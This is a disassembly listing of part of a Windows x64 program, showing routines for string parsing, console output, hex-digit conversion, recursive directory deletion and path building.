   140003a6e:	41 8b c4             	mov    %r12d,%eax
   140003a71:	45 84 ff             	test   %r15b,%r15b
   140003a74:	74 67                	je     0x140003add
   140003a76:	48 63 4c 24 20       	movslq 0x20(%rsp),%rcx
   140003a7b:	2b c1                	sub    %ecx,%eax
   140003a7d:	3b f8                	cmp    %eax,%edi
   140003a7f:	0f 8f 92 00 00 00    	jg     0x140003b17
   140003a85:	48 8b 94 24 90 10 00 	mov    0x1090(%rsp),%rdx
   140003a8c:	00 
   140003a8d:	8b c7                	mov    %edi,%eax
   140003a8f:	4c 8b c1             	mov    %rcx,%r8
   140003a92:	48 8d 4c 04 30       	lea    0x30(%rsp,%rax,1),%rcx
   140003a97:	e8 a4 03 02 00       	call   0x140023e40
   140003a9c:	85 c0                	test   %eax,%eax
   140003a9e:	0f 84 b1 00 00 00    	je     0x140003b55
   140003aa4:	44 8a 2e             	mov    (%rsi),%r13b
   140003aa7:	45 84 ed             	test   %r13b,%r13b
   140003aaa:	0f 84 b1 00 00 00    	je     0x140003b61
   140003ab0:	8b 45 08             	mov    0x8(%rbp),%eax
   140003ab3:	39 45 0c             	cmp    %eax,0xc(%rbp)
   140003ab6:	75 08                	jne    0x140003ac0
   140003ab8:	48 8b cd             	mov    %rbp,%rcx
   140003abb:	e8 d4 52 01 00       	call   0x140018d94
   140003ac0:	8b 55 08             	mov    0x8(%rbp),%edx
   140003ac3:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   140003ac7:	ff c7                	inc    %edi
   140003ac9:	44 88 2c 0a          	mov    %r13b,(%rdx,%rcx,1)
   140003acd:	ff c2                	inc    %edx
   140003acf:	48 ff c6             	inc    %rsi
   140003ad2:	88 1c 0a             	mov    %bl,(%rdx,%rcx,1)
   140003ad5:	89 55 08             	mov    %edx,0x8(%rbp)
   140003ad8:	4d 8b ee             	mov    %r14,%r13
   140003adb:	eb 91                	jmp    0x140003a6e
   140003add:	41 2b c6             	sub    %r14d,%eax
   140003ae0:	3b f8                	cmp    %eax,%edi
   140003ae2:	7f 33                	jg     0x140003b17
   140003ae4:	48 8b 94 24 88 10 00 	mov    0x1088(%rsp),%rdx
   140003aeb:	00 
   140003aec:	8b c7                	mov    %edi,%eax
   140003aee:	4d 8b c5             	mov    %r13,%r8
   140003af1:	48 8d 4c 04 30       	lea    0x30(%rsp,%rax,1),%rcx
   140003af6:	e8 45 03 02 00       	call   0x140023e40
   140003afb:	85 c0                	test   %eax,%eax
   140003afd:	75 0e                	jne    0x140003b0d
   140003aff:	41 03 fe             	add    %r14d,%edi
   140003b02:	41 b7 01             	mov    $0x1,%r15b
   140003b05:	49 03 f5             	add    %r13,%rsi
   140003b08:	e9 61 ff ff ff       	jmp    0x140003a6e
   140003b0d:	ff c7                	inc    %edi
   140003b0f:	48 ff c6             	inc    %rsi
   140003b12:	e9 57 ff ff ff       	jmp    0x140003a6e
   140003b17:	4c 8b 6c 24 28       	mov    0x28(%rsp),%r13
   140003b1c:	8b c7                	mov    %edi,%eax
   140003b1e:	44 2b e7             	sub    %edi,%r12d
   140003b21:	4c 03 e8             	add    %rax,%r13
   140003b24:	48 8d 54 04 30       	lea    0x30(%rsp,%rax,1),%rdx
   140003b29:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003b2e:	45 8b c4             	mov    %r12d,%r8d
   140003b31:	41 8b fc             	mov    %r12d,%edi
   140003b34:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   140003b39:	ff 15 f9 1a 02 00    	call   *0x21af9(%rip)        # 0x140025638
   140003b3f:	49 81 fd 00 00 10 00 	cmp    $0x100000,%r13
   140003b46:	77 11                	ja     0x140003b59
   140003b48:	48 8b b4 24 80 10 00 	mov    0x1080(%rsp),%rsi
   140003b4f:	00 
   140003b50:	e9 d6 fe ff ff       	jmp    0x140003a2b
   140003b55:	b0 01                	mov    $0x1,%al
   140003b57:	eb 0a                	jmp    0x140003b63
   140003b59:	39 5d 08             	cmp    %ebx,0x8(%rbp)
   140003b5c:	0f 95 c0             	setne  %al
   140003b5f:	eb 02                	jmp    0x140003b63
   140003b61:	32 c0                	xor    %al,%al
   140003b63:	48 81 c4 38 10 00 00 	add    $0x1038,%rsp
   140003b6a:	41 5f                	pop    %r15
   140003b6c:	41 5e                	pop    %r14
   140003b6e:	41 5d                	pop    %r13
   140003b70:	41 5c                	pop    %r12
   140003b72:	5f                   	pop    %rdi
   140003b73:	5e                   	pop    %rsi
   140003b74:	5d                   	pop    %rbp
   140003b75:	5b                   	pop    %rbx
   140003b76:	c3                   	ret
   140003b77:	cc                   	int3
   140003b78:	44 8b 51 08          	mov    0x8(%rcx),%r10d
   140003b7c:	4c 8b ca             	mov    %rdx,%r9
   140003b7f:	4c 8b d9             	mov    %rcx,%r11
   140003b82:	44 39 12             	cmp    %r10d,(%rdx)
   140003b85:	7d 63                	jge    0x140003bea
   140003b87:	44 8b 05 82 85 02 00 	mov    0x28582(%rip),%r8d        # 0x14002c110
   140003b8e:	49 63 11             	movslq (%r9),%rdx
   140003b91:	49 8b 03             	mov    (%r11),%rax
   140003b94:	8a 0c 02             	mov    (%rdx,%rax,1),%cl
   140003b97:	80 f9 0a             	cmp    $0xa,%cl
   140003b9a:	74 38                	je     0x140003bd4
   140003b9c:	80 f9 20             	cmp    $0x20,%cl
   140003b9f:	74 3d                	je     0x140003bde
   140003ba1:	80 f9 0d             	cmp    $0xd,%cl
   140003ba4:	74 38                	je     0x140003bde
   140003ba6:	84 c9                	test   %cl,%cl
   140003ba8:	74 34                	je     0x140003bde
   140003baa:	80 f9 09             	cmp    $0x9,%cl
   140003bad:	74 2f                	je     0x140003bde
   140003baf:	80 f9 3b             	cmp    $0x3b,%cl
   140003bb2:	75 39                	jne    0x140003bed
   140003bb4:	45 39 11             	cmp    %r10d,(%r9)
   140003bb7:	7d 31                	jge    0x140003bea
   140003bb9:	49 63 11             	movslq (%r9),%rdx
   140003bbc:	49 8b 03             	mov    (%r11),%rax
   140003bbf:	80 3c 02 0a          	cmpb   $0xa,(%rdx,%rax,1)
   140003bc3:	48 8b ca             	mov    %rdx,%rcx
   140003bc6:	74 0c                	je     0x140003bd4
   140003bc8:	8d 42 01             	lea    0x1(%rdx),%eax
   140003bcb:	41 89 01             	mov    %eax,(%r9)
   140003bce:	41 3b 43 08          	cmp    0x8(%r11),%eax
   140003bd2:	eb e3                	jmp    0x140003bb7
   140003bd4:	41 ff c0             	inc    %r8d
   140003bd7:	44 89 05 32 85 02 00 	mov    %r8d,0x28532(%rip)        # 0x14002c110
   140003bde:	41 ff 01             	incl   (%r9)
   140003be1:	45 8b 53 08          	mov    0x8(%r11),%r10d
   140003be5:	45 39 11             	cmp    %r10d,(%r9)
   140003be8:	7c a4                	jl     0x140003b8e
   140003bea:	32 c0                	xor    %al,%al
   140003bec:	c3                   	ret
   140003bed:	b0 01                	mov    $0x1,%al
   140003bef:	c3                   	ret
   140003bf0:	48 83 ec 38          	sub    $0x38,%rsp
   140003bf4:	88 4c 24 40          	mov    %cl,0x40(%rsp)
   140003bf8:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140003bfd:	66 c7 44 24 41 0d 0a 	movw   $0xa0d,0x41(%rsp)
   140003c04:	ff 15 86 16 02 00    	call   *0x21686(%rip)        # 0x140025290
   140003c0a:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140003c10:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140003c15:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140003c1a:	48 8b c8             	mov    %rax,%rcx
   140003c1d:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140003c23:	ff 15 6f 16 02 00    	call   *0x2166f(%rip)        # 0x140025298
   140003c29:	48 83 c4 38          	add    $0x38,%rsp
   140003c2d:	c3                   	ret
   140003c2e:	cc                   	int3
   140003c2f:	cc                   	int3
   140003c30:	0f b7 c1             	movzwl %cx,%eax
   140003c33:	ba 30 00 00 00       	mov    $0x30,%edx
   140003c38:	66 2b c2             	sub    %dx,%ax
   140003c3b:	66 83 f8 09          	cmp    $0x9,%ax
   140003c3f:	77 06                	ja     0x140003c47
   140003c41:	0f b7 c1             	movzwl %cx,%eax
   140003c44:	2b c2                	sub    %edx,%eax
   140003c46:	c3                   	ret
   140003c47:	8d 41 9f             	lea    -0x61(%rcx),%eax
   140003c4a:	66 83 f8 19          	cmp    $0x19,%ax
   140003c4e:	77 07                	ja     0x140003c57
   140003c50:	0f b7 c1             	movzwl %cx,%eax
   140003c53:	83 e8 57             	sub    $0x57,%eax
   140003c56:	c3                   	ret
   140003c57:	8d 41 bf             	lea    -0x41(%rcx),%eax
   140003c5a:	66 83 f8 19          	cmp    $0x19,%ax
   140003c5e:	77 07                	ja     0x140003c67
   140003c60:	0f b7 c1             	movzwl %cx,%eax
   140003c63:	83 e8 37             	sub    $0x37,%eax
   140003c66:	c3                   	ret
   140003c67:	83 c8 ff             	or     $0xffffffff,%eax
   140003c6a:	c3                   	ret
   140003c6b:	cc                   	int3
   140003c6c:	48 83 ec 28          	sub    $0x28,%rsp
   140003c70:	4c 8b c9             	mov    %rcx,%r9
   140003c73:	0f b7 09             	movzwl (%rcx),%ecx
   140003c76:	e8 b5 ff ff ff       	call   0x140003c30
   140003c7b:	44 8b c0             	mov    %eax,%r8d
   140003c7e:	41 c1 e0 04          	shl    $0x4,%r8d
   140003c82:	45 85 c0             	test   %r8d,%r8d
   140003c85:	78 14                	js     0x140003c9b
   140003c87:	41 0f b7 49 02       	movzwl 0x2(%r9),%ecx
   140003c8c:	e8 9f ff ff ff       	call   0x140003c30
   140003c91:	44 0b c0             	or     %eax,%r8d
   140003c94:	7c 05                	jl     0x140003c9b
   140003c96:	41 8b c0             	mov    %r8d,%eax
   140003c99:	eb 03                	jmp    0x140003c9e
   140003c9b:	83 c8 ff             	or     $0xffffffff,%eax
   140003c9e:	48 83 c4 28          	add    $0x28,%rsp
   140003ca2:	c3                   	ret
   140003ca3:	cc                   	int3
   140003ca4:	48 8b c4             	mov    %rsp,%rax
   140003ca7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003cab:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140003caf:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140003cb3:	55                   	push   %rbp
   140003cb4:	48 8d a8 78 fe ff ff 	lea    -0x188(%rax),%rbp
   140003cbb:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   140003cc2:	48 8b d9             	mov    %rcx,%rbx
   140003cc5:	48 8b d1             	mov    %rcx,%rdx
   140003cc8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003ccd:	e8 be 57 01 00       	call   0x140019490
   140003cd2:	48 8d 15 a3 25 02 00 	lea    0x225a3(%rip),%rdx        # 0x14002627c
   140003cd9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003cde:	e8 59 59 01 00       	call   0x14001963c
   140003ce3:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003ce8:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003ced:	ff 15 6d 15 02 00    	call   *0x2156d(%rip)        # 0x140025260
   140003cf3:	33 f6                	xor    %esi,%esi
   140003cf5:	48 8b f8             	mov    %rax,%rdi
   140003cf8:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003cfc:	0f 84 d3 00 00 00    	je     0x140003dd5
   140003d02:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003d07:	48 8b d3             	mov    %rbx,%rdx
   140003d0a:	e8 19 58 01 00       	call   0x140019528
   140003d0f:	44 8b 5c 24 28       	mov    0x28(%rsp),%r11d
   140003d14:	44 39 5c 24 2c       	cmp    %r11d,0x2c(%rsp)
   140003d19:	75 0f                	jne    0x140003d2a
   140003d1b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003d20:	e8 87 54 01 00       	call   0x1400191ac
   140003d25:	44 8b 5c 24 28       	mov    0x28(%rsp),%r11d
   140003d2a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003d2f:	41 8b c3             	mov    %r11d,%eax
   140003d32:	41 ff c3             	inc    %r11d
   140003d35:	ba 5c 00 00 00       	mov    $0x5c,%edx
   140003d3a:	66 89 14 41          	mov    %dx,(%rcx,%rax,2)
   140003d3e:	66 42 89 34 59       	mov    %si,(%rcx,%r11,2)
   140003d43:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003d48:	48 8d 54 24 5c       	lea    0x5c(%rsp),%rdx
   140003d4d:	44 89 5c 24 28       	mov    %r11d,0x28(%rsp)
   140003d52:	e8 e5 58 01 00       	call   0x14001963c
   140003d57:	f6 44 24 30 10       	testb  $0x10,0x30(%rsp)
   140003d5c:	74 38                	je     0x140003d96
   140003d5e:	48 8d 15 13 25 02 00 	lea    0x22513(%rip),%rdx        # 0x140026278
   140003d65:	48 8d 4c 24 5c       	lea    0x5c(%rsp),%rcx
   140003d6a:	ff 15 f8 14 02 00    	call   *0x214f8(%rip)        # 0x140025268
   140003d70:	85 c0                	test   %eax,%eax
   140003d72:	74 42                	je     0x140003db6
   140003d74:	48 8d 15 f5 24 02 00 	lea    0x224f5(%rip),%rdx        # 0x140026270
   140003d7b:	48 8d 4c 24 5c       	lea    0x5c(%rsp),%rcx
   140003d80:	ff 15 e2 14 02 00    	call   *0x214e2(%rip)        # 0x140025268
   140003d86:	85 c0                	test   %eax,%eax
   140003d88:	74 2c                	je     0x140003db6
   140003d8a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003d8f:	e8 10 ff ff ff       	call   0x140003ca4
   140003d94:	eb 1c                	jmp    0x140003db2
   140003d96:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003d9b:	33 d2                	xor    %edx,%edx
   140003d9d:	ff 15 45 15 02 00    	call   *0x21545(%rip)        # 0x1400252e8
   140003da3:	85 c0                	test   %eax,%eax
   140003da5:	74 68                	je     0x140003e0f
   140003da7:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003dac:	ff 15 be 14 02 00    	call   *0x214be(%rip)        # 0x140025270
   140003db2:	85 c0                	test   %eax,%eax
   140003db4:	74 59                	je     0x140003e0f
   140003db6:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003dbb:	48 8b cf             	mov    %rdi,%rcx
   140003dbe:	ff 15 b4 14 02 00    	call   *0x214b4(%rip)        # 0x140025278
   140003dc4:	85 c0                	test   %eax,%eax
   140003dc6:	0f 85 36 ff ff ff    	jne    0x140003d02
   140003dcc:	48 8b cf             	mov    %rdi,%rcx
   140003dcf:	ff 15 ab 14 02 00    	call   *0x214ab(%rip)        # 0x140025280
   140003dd5:	48 8b 0d ac 8d 02 00 	mov    0x28dac(%rip),%rcx        # 0x14002cb88
   140003ddc:	ff 15 d6 14 02 00    	call   *0x214d6(%rip)        # 0x1400252b8
   140003de2:	33 d2                	xor    %edx,%edx
   140003de4:	48 8b cb             	mov    %rbx,%rcx
   140003de7:	ff 15 fb 14 02 00    	call   *0x214fb(%rip)        # 0x1400252e8
   140003ded:	85 c0                	test   %eax,%eax
   140003def:	74 1e                	je     0x140003e0f
   140003df1:	48 8b cb             	mov    %rbx,%rcx
   140003df4:	ff 15 8e 14 02 00    	call   *0x2148e(%rip)        # 0x140025288
   140003dfa:	85 c0                	test   %eax,%eax
   140003dfc:	74 11                	je     0x140003e0f
   140003dfe:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003e03:	e8 66 ff 01 00       	call   0x140023d6e
   140003e08:	b8 01 00 00 00       	mov    $0x1,%eax
   140003e0d:	eb 0c                	jmp    0x140003e1b
   140003e0f:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003e14:	e8 55 ff 01 00       	call   0x140023d6e
   140003e19:	33 c0                	xor    %eax,%eax
   140003e1b:	4c 8d 9c 24 80 02 00 	lea    0x280(%rsp),%r11
   140003e22:	00 
   140003e23:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140003e27:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140003e2b:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140003e2f:	49 8b e3             	mov    %r11,%rsp
   140003e32:	5d                   	pop    %rbp
   140003e33:	c3                   	ret
   140003e34:	40 53                	rex push %rbx
   140003e36:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   140003e3d:	83 3d f8 8e 02 00 00 	cmpl   $0x0,0x28ef8(%rip)        # 0x14002cd3c
   140003e44:	48 8b d9             	mov    %rcx,%rbx
   140003e47:	74 07                	je     0x140003e50
   140003e49:	b8 01 00 00 00       	mov    $0x1,%eax
   140003e4e:	eb 44                	jmp    0x140003e94
   140003e50:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003e55:	ff 15 05 14 02 00    	call   *0x21405(%rip)        # 0x140025260
   140003e5b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003e5f:	74 e8                	je     0x140003e49
   140003e61:	48 8b c8             	mov    %rax,%rcx
   140003e64:	ff 15 16 14 02 00    	call   *0x21416(%rip)        # 0x140025280
   140003e6a:	f6 44 24 20 10       	testb  $0x10,0x20(%rsp)
   140003e6f:	48 8b cb             	mov    %rbx,%rcx
   140003e72:	75 1b                	jne    0x140003e8f
   140003e74:	33 d2                	xor    %edx,%edx
   140003e76:	ff 15 6c 14 02 00    	call   *0x2146c(%rip)        # 0x1400252e8
   140003e7c:	85 c0                	test   %eax,%eax
   140003e7e:	74 0b                	je     0x140003e8b
   140003e80:	48 8b cb             	mov    %rbx,%rcx
   140003e83:	ff 15 e7 13 02 00    	call   *0x213e7(%rip)        # 0x140025270
   140003e89:	eb 09                	jmp    0x140003e94
   140003e8b:	33 c0                	xor    %eax,%eax
   140003e8d:	eb 05                	jmp    0x140003e94
   140003e8f:	e8 10 fe ff ff       	call   0x140003ca4
   140003e94:	48 81 c4 70 02 00 00 	add    $0x270,%rsp
   140003e9b:	5b                   	pop    %rbx
   140003e9c:	c3                   	ret
   140003e9d:	cc                   	int3
   140003e9e:	cc                   	int3
   140003e9f:	cc                   	int3
   140003ea0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003ea5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003eaa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003eaf:	57                   	push   %rdi
   140003eb0:	41 54                	push   %r12
   140003eb2:	41 55                	push   %r13
   140003eb4:	48 83 ec 20          	sub    $0x20,%rsp
   140003eb8:	48 8b 02             	mov    (%rdx),%rax
   140003ebb:	33 ed                	xor    %ebp,%ebp
   140003ebd:	48 8b fa             	mov    %rdx,%rdi
   140003ec0:	89 6a 08             	mov    %ebp,0x8(%rdx)
   140003ec3:	66 89 28             	mov    %bp,(%rax)
   140003ec6:	0f b7 01             	movzwl (%rcx),%eax
   140003ec9:	48 8b d9             	mov    %rcx,%rbx
   140003ecc:	eb 0d                	jmp    0x140003edb
   140003ece:	66 83 f8 20          	cmp    $0x20,%ax
   140003ed2:	77 0c                	ja     0x140003ee0
   140003ed4:	48 83 c3 02          	add    $0x2,%rbx
   140003ed8:	0f b7 03             	movzwl (%rbx),%eax
   140003edb:	66 85 c0             	test   %ax,%ax
   140003ede:	75 ee                	jne    0x140003ece
   140003ee0:	66 83 3b 2c          	cmpw   $0x2c,(%rbx)
   140003ee4:	75 04                	jne    0x140003eea
   140003ee6:	48 83 c3 02          	add    $0x2,%rbx
   140003eea:	41 bc 7b 00 00 00    	mov    $0x7b,%r12d
   140003ef0:	eb 0f                	jmp    0x140003f01
   140003ef2:	66 85 c0             	test   %ax,%ax
   140003ef5:	74 7f                	je     0x140003f76
   140003ef7:	66 83 f8 2c          	cmp    $0x2c,%ax
   140003efb:	74 79                	je     0x140003f76
   140003efd:	48 83 c3 02          	add    $0x2,%rbx
   140003f01:	0f b7 03             	movzwl (%rbx),%eax
   140003f04:	66 41 3b c4          	cmp    %r12w,%ax
   140003f08:	75 e8                	jne    0x140003ef2
   140003f0a:	48 83 c3 02          	add    $0x2,%rbx
   140003f0e:	0f b7 03             	movzwl (%rbx),%eax
   140003f11:	66 85 c0             	test   %ax,%ax
   140003f14:	74 60                	je     0x140003f76
   140003f16:	41 bd 7d 00 00 00    	mov    $0x7d,%r13d
   140003f1c:	0f b7 c8             	movzwl %ax,%ecx
   140003f1f:	41 3b cc             	cmp    %r12d,%ecx
   140003f22:	74 12                	je     0x140003f36
   140003f24:	41 3b cd             	cmp    %r13d,%ecx
   140003f27:	75 19                	jne    0x140003f42
   140003f29:	66 44 39 6b 02       	cmp    %r13w,0x2(%rbx)
   140003f2e:	75 62                	jne    0x140003f92
   140003f30:	48 83 c3 02          	add    $0x2,%rbx
   140003f34:	eb 0c                	jmp    0x140003f42
   140003f36:	48 8d 43 02          	lea    0x2(%rbx),%rax
   140003f3a:	66 44 39 20          	cmp    %r12w,(%rax)
   140003f3e:	48 0f 44 d8          	cmove  %rax,%rbx
   140003f42:	8b 47 08             	mov    0x8(%rdi),%eax
   140003f45:	0f b7 33             	movzwl (%rbx),%esi
   140003f48:	39 47 0c             	cmp    %eax,0xc(%rdi)
   140003f4b:	75 08                	jne    0x140003f55
   140003f4d:	48 8b cf             	mov    %rdi,%rcx
   140003f50:	e8 57 52 01 00       	call   0x1400191ac
   140003f55:	8b 57 08             	mov    0x8(%rdi),%edx
   140003f58:	48 8b 0f             	mov    (%rdi),%rcx
   140003f5b:	48 83 c3 02          	add    $0x2,%rbx
   140003f5f:	66 89 34 51          	mov    %si,(%rcx,%rdx,2)
   140003f63:	ff c2                	inc    %edx
   140003f65:	66 89 2c 51          	mov    %bp,(%rcx,%rdx,2)
   140003f69:	89 57 08             	mov    %edx,0x8(%rdi)
   140003f6c:	8b c2                	mov    %edx,%eax
   140003f6e:	0f b7 03             	movzwl (%rbx),%eax
   140003f71:	66 85 c0             	test   %ax,%ax
   140003f74:	75 a6                	jne    0x140003f1c
   140003f76:	48 8b c3             	mov    %rbx,%rax
   140003f79:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003f7e:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140003f83:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140003f88:	48 83 c4 20          	add    $0x20,%rsp
   140003f8c:	41 5d                	pop    %r13
   140003f8e:	41 5c                	pop    %r12
   140003f90:	5f                   	pop    %rdi
   140003f91:	c3                   	ret
   140003f92:	48 8d 43 02          	lea    0x2(%rbx),%rax
   140003f96:	eb e1                	jmp    0x140003f79
   140003f98:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003f9d:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140003fa2:	55                   	push   %rbp
   140003fa3:	48 8b ec             	mov    %rsp,%rbp
   140003fa6:	48 83 ec 40          	sub    $0x40,%rsp
   140003faa:	48 8b f9             	mov    %rcx,%rdi
   140003fad:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003fb1:	48 8b da             	mov    %rdx,%rbx
   140003fb4:	e8 9f 54 01 00       	call   0x140019458
   140003fb9:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003fbd:	48 8b d3             	mov    %rbx,%rdx
   140003fc0:	e8 f3 55 01 00       	call   0x1400195b8
   140003fc5:	48 8d 15 e0 22 02 00 	lea    0x222e0(%rip),%rdx        # 0x1400262ac
   140003fcc:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003fd0:	e8 67 56 01 00       	call   0x14001963c
   140003fd5:	48 8d 15 c4 22 02 00 	lea    0x222c4(%rip),%rdx        # 0x1400262a0
   140003fdc:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140003fe0:	e8 ab 54 01 00       	call   0x140019490
   140003fe5:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140003fe9:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140003fed:	48 8b cf             	mov    %rdi,%rcx
   140003ff0:	e8 2f 5a 01 00       	call   0x140019a24
   140003ff5:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140003ff9:	e8 70 fd 01 00       	call   0x140023d6e
   140003ffe:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004002:	48 8b d3             	mov    %rbx,%rdx
   140004005:	e8 ae 55 01 00       	call   0x1400195b8
   14000400a:	48 8d 15 8b 22 02 00 	lea    0x2228b(%rip),%rdx        # 0x14002629c
   140004011:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004015:	e8 22 56 01 00       	call   0x14001963c
   14000401a:	48 8d 15 6f 22 02 00 	lea    0x2226f(%rip),%rdx        # 0x140026290
   140004021:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140004025:	e8 66 54 01 00       	call   0x140019490
   14000402a:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   14000402e:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140004032:	48 8b cf             	mov    %rdi,%rcx
   140004035:	e8 ea 59 01 00       	call   0x140019a24
   14000403a:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   14000403e:	e8 2b fd 01 00       	call   0x140023d6e
   140004043:	48 8d 15 3e 22 02 00 	lea    0x2223e(%rip),%rdx        # 0x140026288
   14000404a:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000404e:	e8 3d 54 01 00       	call   0x140019490
   140004053:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140004057:	4c 8b c3             	mov    %rbx,%r8
   14000405a:	48 8b cf             	mov    %rdi,%rcx
   14000405d:	e8 c2 59 01 00       	call   0x140019a24
   140004062:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140004066:	e8 03 fd 01 00       	call   0x140023d6e
   14000406b:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000406f:	e8 fa fc 01 00       	call   0x140023d6e
   140004074:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004079:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   14000407e:	48 83 c4 40          	add    $0x40,%rsp
   140004082:	5d                   	pop    %rbp
   140004083:	c3                   	ret
   140004084:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004089:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000408e:	55                   	push   %rbp
   14000408f:	48 8b ec             	mov    %rsp,%rbp
   140004092:	48 83 ec 40          	sub    $0x40,%rsp
   140004096:	48 8b f9             	mov    %rcx,%rdi
   140004099:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000409d:	48 8b da             	mov    %rdx,%rbx
   1400040a0:	e8 b3 53 01 00       	call   0x140019458
   1400040a5:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400040a9:	48 8b d3             	mov    %rbx,%rdx
   1400040ac:	e8 07 55 01 00       	call   0x1400195b8
   1400040b1:	48 8d 15 f4 21 02 00 	lea    0x221f4(%rip),%rdx        # 0x1400262ac
   1400040b8:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400040bc:	e8 7b 55 01 00       	call   0x14001963c
   1400040c1:	48 8d 15 00 22 02 00 	lea    0x22200(%rip),%rdx        # 0x1400262c8
   1400040c8:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400040cc:	e8 bf 53 01 00       	call   0x140019490
   1400040d1:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400040d5:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1400040d9:	48 8b cf             	mov    %rdi,%rcx
   1400040dc:	e8 43 59 01 00       	call   0x140019a24
   1400040e1:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1400040e5:	e8 84 fc 01 00       	call   0x140023d6e
   1400040ea:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400040ee:	48 8b d3             	mov    %rbx,%rdx
   1400040f1:	e8 c2 54 01 00       	call   0x1400195b8
   1400040f6:	48 8d 15 9f 21 02 00 	lea    0x2219f(%rip),%rdx        # 0x14002629c
   1400040fd:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004101:	e8 36 55 01 00       	call   0x14001963c
   140004106:	48 8d 15 ab 21 02 00 	lea    0x221ab(%rip),%rdx        # 0x1400262b8
   14000410d:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140004111:	e8 7a 53 01 00       	call   0x140019490
   140004116:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   14000411a:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   14000411e:	48 8b cf             	mov    %rdi,%rcx
   140004121:	e8 fe 58 01 00       	call   0x140019a24
   140004126:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   14000412a:	e8 3f fc 01 00       	call   0x140023d6e
   14000412f:	48 8d 15 7a 21 02 00 	lea    0x2217a(%rip),%rdx        # 0x1400262b0
   140004136:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000413a:	e8 51 53 01 00       	call   0x140019490
   14000413f:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140004143:	4c 8b c3             	mov    %rbx,%r8
   140004146:	48 8b cf             	mov    %rdi,%rcx
   140004149:	e8 d6 58 01 00       	call   0x140019a24
   14000414e:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140004152:	e8 17 fc 01 00       	call   0x140023d6e
   140004157:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000415b:	e8 0e fc 01 00       	call   0x140023d6e
   140004160:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004165:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   14000416a:	48 83 c4 40          	add    $0x40,%rsp
